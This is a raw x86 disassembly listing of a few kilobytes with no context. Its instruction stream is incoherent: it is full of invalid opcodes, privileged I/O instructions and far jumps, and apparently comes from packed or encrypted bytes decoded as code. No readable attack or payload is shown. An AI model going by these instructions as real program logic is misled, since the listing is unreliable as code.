  410b45:	(bad)  
  410b46:	(bad)  
  410b47:	pop    esi
  410b48:	mov    bl,0x76
  410b4a:	in     al,dx
  410b4b:	mov    bl,BYTE PTR [eax]
  410b4d:	pop    ss
  410b4e:	mov    dl,0xd2
  410b50:	jecxz  0x410bb6
  410b52:	cli    
  410b53:	and    ebx,DWORD PTR [ebp+0x5b]
  410b56:	cmp    ch,BYTE PTR [edx+eax*8+0x5f8ba9de]
  410b5d:	cli    
  410b5e:	inc    edx
  410b5f:	and    BYTE PTR [ebx+0x63],0x9
  410b63:	add    dh,0xf3
  410b66:	adc    al,0x4d
  410b68:	jns    0x410ba9
  410b6a:	add    BYTE PTR [esi-0xf98a566],dl
  410b70:	icebp  
  410b71:	sti    
  410b72:	and    DWORD PTR [edx],esi
  410b74:	rcl    DWORD PTR [edi],cl
  410b76:	pop    ebx
  410b77:	test   al,0x95
  410b79:	sti    
  410b7a:	fdiv   st(1),st
  410b7c:	sahf   
  410b7d:	ficomp WORD PTR [eax-0x172bdcb2]
  410b83:	mov    al,ds:0x495879f1
  410b88:	rcr    BYTE PTR [ebp-0xa8b82d],cl
  410b8e:	cli    
  410b8f:	mov    ecx,0xecd3b1f7
  410b94:	and    cl,BYTE PTR [eax-0x21]
  410b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b98:	push   eax
  410b99:	ret    
  410b9a:	pop    edx
  410b9b:	push   eax
  410b9c:	iret   
  410b9d:	adc    edi,edx
  410b9f:	inc    ecx
  410ba0:	jp     0x410b85
  410ba2:	ror    BYTE PTR [ebp+0x57],1
  410ba5:	fwait
  410ba6:	xchg   BYTE PTR [edi+edi*4+0x72f5713a],ah
  410bad:	xor    al,0x75
  410baf:	jbe    0x410bb2
  410bb1:	pop    ebx
  410bb2:	js     0x410b98
  410bb4:	jae    0x410b45
  410bb6:	gs into 
  410bb8:	dec    ebp
  410bb9:	mov    cl,0x82
  410bbb:	rcr    BYTE PTR [ebp+eiz*1-0x459635f0],cl
  410bc2:	pop    ecx
  410bc3:	or     edi,DWORD PTR ds:0xa1603c39
  410bc9:	pusha  
  410bca:	not    dl
  410bcc:	xor    esp,ecx
  410bce:	ror    DWORD PTR [ebx],0x37
  410bd1:	das    
  410bd2:	add    dl,BYTE PTR [edx+0x2c]
  410bd5:	sbb    bh,ch
  410bd7:	lea    edi,[esi-0x1c]
  410bda:	pushf  
  410bdb:	push   esi
  410bdc:	dec    ebp
  410bdd:	fsub   QWORD PTR [esi+0x11122d36]
  410be3:	dec    ecx
  410be4:	sub    edx,DWORD PTR [ecx+0x7f]
  410be7:	aam    0x71
  410be9:	fwait
  410bea:	mov    bl,0x94
  410bec:	ret    0xe1f1
  410bef:	or     ah,BYTE PTR ss:[esi-0x4f]
  410bf3:	sub    eax,DWORD PTR [edi+eax*8+0x19]
  410bf7:	jmp    0x9fa9:0x26414ee0
  410bfe:	jno    0x410ba6
  410c00:	xchg   ecx,eax
  410c01:	jecxz  0x410b9e
  410c03:	scas   al,BYTE PTR es:[edi]
  410c04:	or     DWORD PTR [ebx],eax
  410c06:	sbb    ah,BYTE PTR [esi+ebx*2+0x44]
  410c0a:	pop    ebp
  410c0b:	pop    ebp
  410c0c:	xlat   BYTE PTR ds:[ebx]
  410c0d:	adc    ah,al
  410c0f:	sbb    al,0x18
  410c11:	call   0x497f:0x8a07b04c
  410c18:	jl     0x410bdd
  410c1a:	jb     0x410c48
  410c1c:	push   ebp
  410c1d:	out    dx,al
  410c1e:	cmc    
  410c1f:	out    dx,eax
  410c20:	clc    
  410c21:	inc    esi
  410c22:	inc    edx
  410c23:	sbb    DWORD PTR [ebx+0x66e35308],0xffffffd5
  410c2a:	adc    esi,ebx
  410c2c:	mov    ecx,cs
  410c2e:	cwde   
  410c2f:	call   0xc1486e1e
  410c34:	sti    
  410c35:	mov    al,BYTE PTR [ebx+edx*4]
  410c38:	mov    bh,0x9
  410c3a:	push   ebp
  410c3b:	imul   esi,DWORD PTR [ecx+edi*2],0x38
  410c3f:	mov    ah,0x3f
  410c41:	add    al,0xea
  410c43:	(bad)  
  410c44:	popf   
  410c45:	and    bh,bl
  410c47:	int    0x5
  410c49:	lods   al,BYTE PTR ds:[esi]
  410c4a:	xor    eax,eax
  410c4c:	add    eax,edi
  410c4e:	add    cl,BYTE PTR [eax]
  410c50:	aas    
  410c51:	retf   
  410c52:	sar    BYTE PTR [ebx-0x38d340cf],cl
  410c58:	fwait
  410c59:	jecxz  0x410c47
  410c5b:	mov    ds:0xa9d21568,eax
  410c60:	mov    eax,0xe51e8d0a
  410c65:	jle    0x410bf7
  410c67:	in     eax,0xc5
  410c69:	jge    0x410c49
  410c6b:	push   ecx
  410c6c:	daa    
  410c6d:	or     bl,BYTE PTR [esi+edi*4]
  410c70:	push   esi
  410c71:	mov    esp,0xdf3e4a68
  410c76:	movaps xmm3,XMMWORD PTR [eax-0x5bf19adc]
  410c7d:	in     eax,0xb1
  410c7f:	xchg   ebp,eax
  410c80:	inc    BYTE PTR [edi+0x4140c61a]
  410c86:	in     eax,0x42
  410c88:	aas    
  410c89:	lea    ecx,[eax-0x6b]
  410c8c:	or     DWORD PTR [ecx-0x5c350b4],esp
  410c92:	push   ss
  410c93:	mov    eax,0x9f0dc4e3
  410c98:	fadd   DWORD PTR [edi-0x669a20ba]
  410c9e:	call   0x2557d541
  410ca3:	sti    
  410ca4:	mov    ss,ecx
  410ca6:	mov    esp,DWORD PTR [ecx-0x63]
  410ca9:	leave  
  410caa:	xor    ch,ch
  410cac:	enter  0x407e,0x0
  410cb0:	inc    ebx
  410cb1:	lahf   
  410cb2:	cs jo  0x410cc1
  410cb5:	xchg   ebp,eax
  410cb6:	and    edx,DWORD PTR [esi+eax*4-0x2d63d0dd]
  410cbd:	jae    0x410c96
  410cbf:	xchg   esi,eax
  410cc0:	pushf  
  410cc1:	(bad)  
  410cc2:	sub    DWORD PTR [edx-0x60],esi
  410cc5:	sbb    bh,BYTE PTR [esi+0xf4062cb]
  410ccb:	loop   0x410c59
  410ccd:	ret    0xe520
  410cd0:	ret    0x4d94
  410cd3:	pop    ds
  410cd4:	popa   
  410cd5:	and    DWORD PTR [esi],eax
  410cd7:	and    esi,DWORD PTR ss:[eax+0x7a4b921f]
  410cde:	lods   al,BYTE PTR ds:[esi]
  410cdf:	lea    ebp,[edx]
  410ce1:	adc    ecx,DWORD PTR [edi-0x9]
  410ce4:	ret    0xdf0e
  410ce7:	push   es
  410ce8:	xor    dh,BYTE PTR [ecx-0x35]
  410ceb:	mov    al,0xed
  410ced:	jg     0x410c76
  410cef:	mov    dh,0x49
  410cf1:	xchg   ecx,eax
  410cf2:	jbe    0x410cac
  410cf4:	adc    DWORD PTR [ebx-0x65fbfe68],0xab5f5c15
  410cfe:	inc    DWORD PTR [eax+ebx*2]
  410d01:	xchg   esi,eax
  410d02:	xor    ebx,ecx
  410d04:	lahf   
  410d05:	cdq    
  410d06:	adc    edx,eax
  410d08:	inc    ecx
  410d09:	jecxz  0x410ce6
  410d0b:	das    
  410d0c:	add    al,0x5e
  410d0e:	mov    eax,0xb83bafd7
  410d13:	clc    
  410d14:	xor    BYTE PTR [edx+0x33],dh
  410d17:	add    DWORD PTR [eax-0x5dae1572],edi
  410d1d:	fidivr WORD PTR [esi]
  410d1f:	mov    bh,0x82
  410d21:	push   cs
  410d22:	cmp    BYTE PTR [eax],bh
  410d24:	aam    0x59
  410d26:	or     al,0xcf
  410d28:	loopne 0x410d8a
  410d2a:	pop    edx
  410d2b:	jne    0x410d3e
  410d2d:	dec    ebx
  410d2e:	dec    esp
  410d2f:	pop    ecx
  410d30:	and    BYTE PTR [esi-0x6],ah
  410d33:	popf   
  410d34:	adc    ebp,DWORD PTR [eax+0x23]
  410d37:	ret    
  410d38:	ret    
  410d39:	add    DWORD PTR [edi-0xf2f495f],edx
  410d3f:	mov    al,ds:0xc09d95d0
  410d44:	sub    eax,0x22eae100
  410d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d4a:	xor    eax,0x6901f2bb
  410d4f:	out    0x4c,al
  410d51:	and    DWORD PTR [ecx+0x1f],0xf8f0ba34
  410d58:	xchg   edx,eax
  410d59:	inc    esp
  410d5a:	pop    es
  410d5b:	fnstsw WORD PTR [edi+eiz*1+0x3e]
  410d5f:	sub    BYTE PTR [eax-0x77b87401],dl
  410d65:	mov    ecx,0x208608d0
  410d6a:	out    0xf4,eax
  410d6c:	sub    BYTE PTR [ecx+0x6b81f137],al
  410d72:	inc    eax
  410d73:	dec    ecx
  410d74:	pop    edx
  410d75:	fcomp  DWORD PTR [eax-0x5a710e50]
  410d7b:	push   ebx
  410d7c:	adc    al,0x59
  410d7e:	popa   
  410d7f:	sub    cl,0x7f
  410d82:	mov    al,ch
  410d84:	push   ss
  410d85:	add    al,0x28
  410d87:	mov    edx,0x1bc21b53
  410d8c:	es in  al,dx
  410d8e:	xchg   edi,eax
  410d8f:	dec    ecx
  410d90:	mov    ds:0xe0a64674,eax
  410d95:	retf   
  410d96:	cmp    DWORD PTR [ecx+0x7],esp
  410d99:	shl    DWORD PTR [edi-0x6cfd37ad],cl
  410d9f:	sar    DWORD PTR [edx-0x6974ed01],1
  410da5:	push   esp
  410da6:	push   esi
  410da7:	in     eax,dx
  410da8:	add    ebx,DWORD PTR [eax-0x238f2dc0]
  410dae:	fimul  WORD PTR [edi-0x709ee809]
  410db4:	ds dec edx
  410db6:	mov    DWORD PTR [edi+eax*1+0x1bc6f972],ecx
  410dbd:	cmp    ebp,esi
  410dbf:	sub    al,0xb7
  410dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc2:	xchg   ebp,eax
  410dc3:	call   0xdb2e577
  410dc8:	pop    esi
  410dc9:	cmp    cl,BYTE PTR [esp+ebp*1]
  410dcc:	retf   0x1492
  410dcf:	xchg   ecx,eax
  410dd0:	mov    al,0xf5
  410dd2:	xor    al,bl
  410dd4:	out    dx,al
  410dd5:	push   ds
  410dd6:	dec    esp
  410dd7:	dec    ecx
  410dd8:	aad    0xf4
  410dda:	leave  
  410ddb:	imul   edi,DWORD PTR [esi-0x24246147],0xc22e716c
  410de5:	pop    edi
  410de6:	dec    ebp
  410de7:	call   DWORD PTR [edi+edx*2]
  410dea:	jmp    0x410e6a
  410dec:	push   edx
  410ded:	add    esp,DWORD PTR [esi]
  410def:	in     eax,dx
  410df0:	push   ss
  410df1:	gs mov dh,0xa6
  410df4:	jo     0x410e17
  410df6:	cwde   
  410df7:	sbb    BYTE PTR [edi-0x18],al
  410dfa:	mov    cl,BYTE PTR [edi+0x63]
  410dfd:	imul   eax,DWORD PTR [ebx-0x52],0xc3f04de5
  410e04:	test   BYTE PTR [esi],al
  410e06:	xlat   BYTE PTR es:[ebx]
  410e08:	fldenv [eax]
  410e0a:	cmp    esi,ebx
  410e0c:	xchg   edx,eax
  410e0d:	add    ebx,DWORD PTR [ebx]
  410e0f:	push   ss
  410e10:	or     al,BYTE PTR ds:0x38a43317
  410e16:	pop    edi
  410e17:	lds    edi,FWORD PTR cs:[eax-0x5e26db8d]
  410e1e:	jle    0x410e92
  410e20:	jns    0x410dfc
  410e22:	fadd   DWORD PTR [eax+0x34]
  410e25:	es xchg edx,eax
  410e27:	lock jp 0x410dbf
  410e2a:	ss iret 
  410e2c:	inc    edi
  410e2d:	cli    
  410e2e:	inc    edi
  410e2f:	not    esp
  410e31:	(bad)  
  410e32:	data16 je 0x410e74
  410e35:	gs push 0x30
  410e38:	mov    al,0xe5
  410e3a:	in     eax,0x32
  410e3c:	sub    al,0xbb
  410e3e:	lods   al,BYTE PTR ds:[esi]
  410e3f:	pop    ebp
  410e40:	sbb    DWORD PTR [ebp+0x36],edx
  410e43:	dec    ecx
  410e44:	mov    ecx,0x18d8f5ef
  410e49:	jecxz  0x410ddc
  410e4b:	xchg   esi,eax
  410e4c:	fmul   QWORD PTR [edx+0x7801a49f]
  410e52:	xor    al,0xc3
  410e54:	inc    ebx
  410e55:	cmp    dl,BYTE PTR [ebx]
  410e57:	mov    bl,0xb5
  410e59:	jmp    0x8baf:0x8a006772
  410e60:	jo     0x410e7f
  410e62:	loopne 0x410ed1
  410e64:	push   0xa5a82a5a
  410e69:	sbb    esi,DWORD PTR [edx+eiz*1-0xa0aaa11]
  410e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e71:	hlt    
  410e72:	or     eax,0xcab4a14a
  410e77:	fnstsw ax
  410e79:	stos   BYTE PTR es:[edi],al
  410e7a:	dec    edx
  410e7b:	lahf   
  410e7c:	xor    ebx,edx
  410e7e:	push   ebp
  410e7f:	push   esp
  410e80:	jle    0x410efe
  410e82:	jp     0x410eef
  410e84:	or     al,dl
  410e86:	test   bh,dl
  410e88:	test   BYTE PTR [edi-0x2dd7cf9a],cl
  410e8e:	or     edx,esi
  410e90:	enter  0x7856,0xf5
  410e94:	aaa    
  410e95:	out    dx,al
  410e96:	mov    cl,0xbf
  410e98:	jmp    0x6099455
  410e9d:	(bad)  
  410e9e:	rcl    BYTE PTR [edx-0x38816a73],cl
  410ea4:	sub    al,0xb0
  410ea6:	fcmovne st,st(0)
  410ea8:	mov    ebx,0xec86d3b6
  410ead:	dec    esp
  410eae:	loope  0x410f2f
  410eb0:	push   ebx
  410eb1:	jmp    0x696b7178
  410eb6:	push   DWORD PTR [esi]
  410eb8:	push   edi
  410eb9:	adc    ah,BYTE PTR [ecx+0x4d]
  410ebc:	push   esi
  410ebd:	neg    bh
  410ebf:	mov    ecx,0x60cfcaa9
  410ec5:	(bad)  
  410ec7:	(bad)  
  410ec8:	pop    eax
  410ec9:	or     DWORD PTR [edx+0x1cfb3a79],eax
  410ecf:	sub    DWORD PTR ds:0x167d7817,esp
  410ed5:	jns    0x410f00
  410ed7:	or     esp,DWORD PTR [edx+0x1e9aa8b5]
  410edd:	xchg   edi,eax
  410ede:	mov    ss,WORD PTR ss:[ecx+0x10]
  410ee2:	daa    
  410ee3:	mov    edi,0x3cf83f40
  410ee8:	mov    bl,0xe0
  410eea:	xlat   BYTE PTR ds:[ebx]
  410eeb:	imul   ecx,edx,0x959af0bb
  410ef1:	into   
  410ef2:	push   ebp
  410ef3:	fstp   DWORD PTR [edx]
  410ef5:	cld    
  410ef6:	in     eax,0x2c
  410ef8:	iret   
  410ef9:	jle    0x410eae
  410efb:	ret    
  410efc:	cmp    ah,BYTE PTR [edi-0x56]
  410eff:	jno    0x410ea5
  410f01:	loopne 0x410f68
  410f03:	cs xor eax,0xc3559c23
  410f09:	mov    WORD PTR [edi],ds
  410f0b:	loop   0x410f6c
  410f0d:	push   ebx
  410f0e:	dec    edx
  410f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f10:	sbb    BYTE PTR [edx+ecx*8-0x2d],cl
  410f14:	inc    ebp
  410f15:	xchg   esi,eax
  410f16:	retf   
  410f17:	loope  0x410e9c
  410f19:	jmp    0xd232:0x1be3a376
  410f20:	mov    dh,0xe
  410f22:	push   0xffffffb1
  410f24:	lock mov edx,0x46a60846
  410f2a:	dec    edi
  410f2b:	arpl   WORD PTR [ebx+eax*2-0x2e],cx
  410f2f:	dec    ecx
  410f30:	je     0x410f93
  410f32:	outs   dx,DWORD PTR ds:[esi]
  410f33:	clc    
  410f34:	fadd   QWORD PTR [esi+0x4a59f547]
  410f3a:	call   0x453b:0x995e10a9
  410f41:	mov    eax,0xd8724864
  410f46:	test   BYTE PTR [eax-0x20],bh
  410f49:	js     0x410f55
  410f4b:	lods   al,BYTE PTR ds:[esi]
  410f4c:	push   eax
  410f4d:	xor    cl,ch
  410f4f:	(bad)  
  410f50:	lods   eax,DWORD PTR ss:[esi]
  410f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f53:	shl    DWORD PTR [ecx+0x4851e39f],cl
  410f59:	test   eax,0x9e10a002
  410f5e:	xlat   BYTE PTR ds:[ebx]
  410f5f:	jl     0x410efe
  410f61:	mov    edi,0x7181cc8
  410f66:	sbb    eax,0x7ed1e7b
  410f6b:	arpl   WORD PTR [esi],sp
  410f6d:	pop    edx
  410f6e:	mov    ds:0xe48b5f16,al
  410f73:	sbb    DWORD PTR [ebx],ebx
  410f75:	inc    edi
  410f76:	fstp   DWORD PTR [ebx+ebp*8+0x7]
  410f7a:	mov    DWORD PTR ds:0xf54b78c9,edi
  410f80:	push   cs
  410f81:	out    0xb1,al
  410f83:	xlat   BYTE PTR cs:[ebx]
  410f85:	mov    ecx,0x2353762e
  410f8a:	xchg   ebp,eax
  410f8b:	dec    ebx
  410f8c:	stc    
  410f8d:	mov    edi,0x9a482b6c
  410f92:	imul   esp
  410f94:	pop    ebp
  410f95:	push   DWORD PTR [ebp-0x42]
  410f98:	add    BYTE PTR [eax],dh
  410f9a:	dec    edi
  410f9b:	inc    ecx
  410f9c:	inc    eax
  410f9d:	stos   DWORD PTR es:[edi],eax
  410f9e:	sahf   
  410f9f:	jecxz  0x41100b
  410fa1:	mov    ah,0xe
  410fa3:	sbb    eax,0xe5688cb8
  410fa8:	outs   dx,BYTE PTR ds:[esi]
  410fa9:	stos   DWORD PTR es:[edi],eax
  410faa:	cmp    al,BYTE PTR [esi]
  410fac:	push   edx
  410fad:	jmp    0xfb718270
  410fb2:	(bad)
  410fb6:	loopne 0x41101e
  410fb8:	push   ebx
  410fb9:	call   0x59c49827
  410fbe:	mov    al,ds:0x44b2c7e6
  410fc3:	arpl   WORD PTR [ebx],bx
  410fc5:	sbb    dl,BYTE PTR [edi+0x2b7bb610]
  410fcb:	hlt    
  410fcc:	sub    BYTE PTR [esp+eax*2],dl
  410fcf:	add    al,0x23
  410fd1:	inc    edi
  410fd2:	push   ebp
  410fd3:	xor    edx,DWORD PTR [ecx+0x4da75d62]
  410fd9:	mov    ecx,0xd8294b39
  410fde:	dec    eax
  410fdf:	int    0xb9
  410fe1:	into   
  410fe2:	xor    dl,BYTE PTR [esi-0x59f4117d]
  410fe8:	push   esi
  410fe9:	pop    esp
  410fea:	sar    esp,cl
  410fec:	ss pusha 
  410fee:	xchg   edi,eax
  410fef:	and    al,0x46
  410ff1:	mov    edx,0x364bc9bf
  410ff6:	and    eax,0xd4bfe0f5
  410ffb:	or     al,0x6c
  410ffd:	retf   
  410ffe:	mov    ebx,0x7eb444f6
  411003:	pop    ss
  411004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411005:	es scas eax,DWORD PTR es:[edi]
  411007:	or     al,0xeb
  411009:	xchg   edx,eax
  41100a:	sti    
  41100b:	cmp    DWORD PTR [edx+0x3f],0xde6442e4
  411012:	mov    bp,ss
  411015:	jns    0x410fdb
  411017:	arpl   WORD PTR [ebx+0x48],dx
  41101a:	xchg   edx,eax
  41101b:	(bad)
  41101f:	jecxz  0x411092
  411021:	jecxz  0x410fc9
  411023:	sahf   
  411024:	sub    cl,ah
  411026:	ffree  st(3)
  411028:	ja     0x411036
  41102a:	pop    ecx
  41102b:	mov    gs,WORD PTR [edi+0x6a54dc23]
  411031:	push   ebx
  411032:	ds xchg ecx,edi
  411035:	adc    edi,DWORD PTR [edx+eiz*1]
  411038:	imul   esp,DWORD PTR [eax-0x7fc9d54],0x9f512052
  411042:	aam    0xe6
  411044:	test   BYTE PTR [ebx+0x4bb476e4],al
  41104a:	push   0xffe68a2d
  41104f:	test   BYTE PTR [eax],0xdb
  411052:	lods   al,BYTE PTR ds:[esi]
  411053:	mov    al,0xa2
  411055:	(bad)  
  411056:	or     al,0xb9
  411058:	jmp    0x49dfa903
  41105d:	xlat   BYTE PTR ds:[ebx]
  41105e:	imul   edx,DWORD PTR [edx+eiz*2-0x2a45a330],0x67
  411066:	test   al,0xd9
  411068:	hlt    
  411069:	jmp    0x411015
  41106b:	je     0x41109e
  41106d:	jmp    0xe0fc:0x190e7104
  411074:	pop    eax
  411075:	cmp    DWORD PTR [ecx+0x39],0x2dd33703
  41107c:	mov    ebp,0xc9acb3c7
  411081:	mov    ecx,0x53cf6e27
  411086:	aam    0xa0
  411088:	rcr    BYTE PTR [edi+0x71deb284],cl
  41108e:	inc    ebx
  41108f:	xor    eax,0x4af604ef
  411094:	or     esi,DWORD PTR [eax+edi*8-0x6f90a500]
  41109b:	retf   
  41109c:	push   0xe185878e
  4110a1:	ja     0x4110c3
  4110a3:	test   edi,ebp
  4110a5:	in     eax,dx
  4110a6:	push   edi
  4110a7:	out    0xc1,eax
  4110a9:	xchg   esi,eax
  4110aa:	cmove  edi,edi
  4110ad:	data16 cmp BYTE PTR [eax-0x1b],dh
  4110b1:	xchg   BYTE PTR [edx-0x64c30dd9],ch
  4110b7:	retf   0xf7fc
  4110ba:	jmp    0xe064:0xf81a7344
  4110c1:	lock jecxz 0x4110e2
  4110c4:	iret   
  4110c5:	or     DWORD PTR [esi-0x4],ebp
  4110c8:	fcos   
  4110ca:	push   ss
  4110cb:	xchg   ebx,eax
  4110cc:	and    BYTE PTR [eax+0x78277048],cl
  4110d2:	mov    ebp,0xcc7d53c4
  4110d7:	add    edx,DWORD PTR [ecx+eiz*1-0x48]
  4110db:	dec    esi
  4110dc:	xchg   ebp,eax
  4110dd:	inc    ebx
  4110de:	and    eax,0x48760fb
  4110e3:	pop    ebx
  4110e4:	xor    eax,0x94d117fb
  4110e9:	inc    edi
  4110ea:	(bad)  
  4110eb:	jns    0x411134
  4110ed:	(bad)  
  4110ee:	clc    
  4110ef:	and    eax,0x9a9037c5
  4110f4:	or     edx,DWORD PTR [ebx+0x42]
  4110f7:	loope  0x41115a
  4110f9:	lock nop
  4110fb:	mov    dl,0x4c
  4110fd:	cmc    
  4110fe:	cwde   
  4110ff:	add    dh,BYTE PTR [ebp-0x59545bdb]
  411105:	push   edx
  411106:	dec    ebx
  411107:	xor    al,BYTE PTR [eax+0x43]
  41110a:	into   
  41110b:	mov    cl,0xd0
  41110d:	pop    eax
  41110e:	inc    edx
  41110f:	imul   esi,DWORD PTR [ecx-0x50],0xffffffdc
  411113:	popa   
  411114:	sub    eax,0x2214f770
  411119:	push   ds
  41111a:	xor    dl,BYTE PTR [ebx+0x65]
  41111d:	les    ebx,FWORD PTR [esi-0x202eb9c5]
  411123:	pusha  
  411124:	xchg   edx,eax
  411125:	addr16 (bad) 
  411127:	dec    edi
  411128:	jl     0x4110da
  41112a:	aam    0xa5
  41112c:	(bad)  
  41112d:	jge    0x411159
  41112f:	loope  0x41119f
  411131:	rcl    BYTE PTR [esi],0x69
  411134:	repnz outs dx,DWORD PTR ds:[esi]
  411136:	(bad)  
  411137:	popa   
  411138:	leave  
  411139:	inc    esi
  41113a:	pop    ecx
  41113b:	enter  0x7924,0xce
  41113f:	cmp    al,0x47
  411141:	jge    0x4110c6
  411143:	es sahf 
  411145:	clc    
  411146:	mov    eax,ds:0x86b12125
  41114b:	jns    0x411112
  41114d:	xchg   BYTE PTR [edx],bh
  41114f:	out    dx,eax
  411150:	xchg   BYTE PTR [ecx],cl
  411152:	xchg   ebp,eax
  411153:	or     eax,0x4d395cd4
  411158:	sar    edi,1
  41115a:	retf   
  41115b:	mov    eax,ds:0x76ad311f
  411160:	push   ebx
  411161:	xor    ch,BYTE PTR [ecx]
  411163:	ja     0x411110
  411165:	in     al,0xa2
  411167:	aas    
  411168:	fcmovnb st,st(0)
  41116a:	push   edi
  41116b:	imul   esi,DWORD PTR [ecx],0xffffffb1
  41116e:	in     eax,dx
  41116f:	ins    BYTE PTR es:[edi],dx
  411170:	sti    
  411171:	je     0x4111a9
  411173:	push   esi
  411174:	pop    eax
  411175:	or     edi,DWORD PTR [eax-0x781e2ba]
  41117b:	jge    0x4111ac
  41117d:	add    DWORD PTR [eax+eax*4+0x69],edx
  411181:	(bad)  
  411182:	cli    
  411183:	xor    esp,0xfffffff9
  411186:	cmc    
  411187:	fs imul esp,eax,0xb3d67d0b
  41118e:	adc    bh,al
  411190:	int    0x1e
  411192:	or     BYTE PTR [edi+0x41f7682],dl
  411198:	cli    
  411199:	xchg   DWORD PTR [edx],ebp
  41119b:	std    
  41119c:	and    DWORD PTR [edx+0x6e],esp
  41119f:	push   ds
  4111a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a1:	add    eax,0x8134081
  4111a6:	cmp    ch,BYTE PTR [edx+0x15b10592]
  4111ac:	push   eax
  4111ad:	scas   al,BYTE PTR es:[edi]
  4111ae:	lods   eax,DWORD PTR ds:[esi]
  4111af:	mov    ebx,0x26e39831
  4111b4:	repnz iretw 
  4111b7:	jecxz  0x41114d
  4111b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ba:	mov    ebx,0xfb87c7a2
  4111bf:	mov    ds:0x27636548,al
  4111c4:	pop    ss
  4111c5:	aad    0x70
  4111c7:	jmp    0x4111ac
  4111c9:	(bad)
  4111cc:	icebp  
  4111cd:	xchg   DWORD PTR [ebp+0x4a1947f7],edi
  4111d3:	sub    DWORD PTR [edi],ecx
  4111d5:	(bad)  
  4111d6:	pop    edx
  4111d7:	mov    ds:0x805ce665,eax
  4111dc:	jb     0x41124c
  4111de:	mov    edx,0xdd722c92
  4111e3:	push   edi
  4111e4:	dec    edx
  4111e5:	jae    0x4111cc
  4111e7:	xchg   edi,eax
  4111e8:	xchg   esp,eax
  4111e9:	cmp    edx,esp
  4111eb:	adc    DWORD PTR [ebp+0x14],esi
  4111ee:	outs   dx,DWORD PTR ds:[esi]
  4111ef:	in     al,dx
  4111f0:	jp     0x411182
  4111f2:	sbb    BYTE PTR [ebp-0x3165572],dh
  4111f8:	dec    edi
  4111f9:	(bad)
  4111fc:	push   edx
  4111fd:	mov    edi,0x5b99c6a2
  411202:	push   edi
  411203:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411205:	jle    0x41126c
  411207:	pop    edi
  411208:	(bad)  
  41120a:	in     al,dx
  41120b:	and    bh,BYTE PTR [edx-0x1f06843e]
  411211:	push   0x12da7434
  411216:	into   
  411217:	in     eax,dx
  411218:	pusha  
  411219:	pushf  
  41121a:	(bad)  
  41121b:	lock lds eax,FWORD PTR [ebp-0x36]
  41121f:	or     edx,DWORD PTR [ebp-0x44]
  411222:	inc    ebx
  411223:	cld    
  411224:	add    BYTE PTR [edi+0xd1f69c9],0x6d
  41122b:	stos   BYTE PTR es:[edi],al
  41122c:	(bad)  
  41122d:	fbld   TBYTE PTR [ebp-0x51fc4dcc]
  411233:	arpl   WORD PTR [eax+0x78ef1e79],bx
  411239:	inc    ebp
  41123a:	add    al,0x80
  41123c:	es mov al,0xb7
  41123f:	ins    BYTE PTR es:[edi],dx
  411240:	sahf   
  411241:	adc    cl,BYTE PTR [esi+0x4bdc5be4]
  411247:	adc    al,0xb1
  411249:	out    dx,al
  41124a:	add    BYTE PTR gs:[ebx],al
  41124d:	mov    esp,0x88d9d1c5
  411252:	or     al,0xe
  411254:	mov    eax,0x9f4b4b4e
  411259:	aaa    
  41125a:	inc    eax
  41125b:	add    BYTE PTR [ecx+0x1058d5b3],dl
  411261:	sbb    ebx,DWORD PTR [edx]
  411263:	ror    BYTE PTR ds:0xdde9d4e8,cl
  411269:	mov    ebp,0x121a8c91
  41126e:	in     al,dx
  41126f:	pop    ecx
  411270:	sbb    ebp,eax
  411272:	outs   dx,BYTE PTR ds:[esi]
  411273:	pop    esp
  411274:	or     bl,BYTE PTR [edi-0x216ac284]
  41127a:	repz push esi
  41127c:	pop    ecx
  41127d:	or     eax,edi
  41127f:	das    
  411280:	sbb    bl,BYTE PTR [esi]
  411282:	in     eax,dx
  411283:	mov    DWORD PTR gs:[edi],ecx
  411286:	inc    esp
  411287:	pop    es
  411288:	xchg   ebx,eax
  411289:	xor    dh,dl
  41128b:	sub    BYTE PTR ds:0xf38d8fcc,0xe0
  411292:	inc    eax
  411293:	mov    edx,0x9513a294
  411298:	mov    dh,0x76
  41129a:	test   esp,eax
  41129c:	pop    esi
  41129d:	outs   dx,BYTE PTR ds:[esi]
  41129e:	xor    al,dl
  4112a0:	jns    0x41122b
  4112a2:	rcr    DWORD PTR [edx-0x7e],1
  4112a5:	or     bh,cl
  4112a7:	cli    
  4112a8:	mov    BYTE PTR [ebx],bh
  4112aa:	jo     0x41123b
  4112ac:	adc    esi,DWORD PTR [edi]
  4112ae:	mov    DWORD PTR [esi+0x5f],edx
  4112b1:	push   esp
  4112b2:	test   eax,0xd9295318
  4112b7:	mov    esi,DWORD PTR [edi]
  4112b9:	ror    BYTE PTR [edx],cl
  4112bb:	xor    esp,edi
  4112bd:	pop    ss
  4112be:	mov    al,0xe3
  4112c0:	mov    al,es:0xabf5c07c
  4112c6:	xchg   esp,eax
  4112c7:	sar    BYTE PTR [edx+0x1b62d5b4],1
  4112cd:	adc    ecx,DWORD PTR ds:0x77d4002e
  4112d3:	mov    ecx,0xc1656757
  4112d8:	aas    
  4112d9:	mov    ah,0xb1
  4112db:	sti    
  4112dc:	fidiv  WORD PTR [edx-0x2e]
  4112df:	sub    eax,0xa25d5793
  4112e4:	inc    esp
  4112e5:	xor    ch,bl
  4112e7:	imul   esp,DWORD PTR [esi-0x11],0xffffff9d
  4112eb:	xchg   BYTE PTR [edx-0x2ba07a3f],ch
  4112f1:	addr16 xor al,0x16
  4112f4:	dec    edx
  4112f5:	(bad)  
  4112f6:	adc    eax,0xd09b14ef
  4112fb:	or     BYTE PTR [edi-0x18b8ebcb],bl
  411301:	lods   al,BYTE PTR ds:[esi]
  411302:	mov    ds:0xf61110f0,al
  411307:	pop    edx
  411308:	mov    ds:0xd3b364fe,al
  41130d:	xchg   ecx,eax
  41130e:	test   DWORD PTR [edi+esi*8-0x4b8b685e],eax
  411315:	fiadd  WORD PTR cs:[ebx-0x9]
  411319:	rol    DWORD PTR [esi+0x1],cl
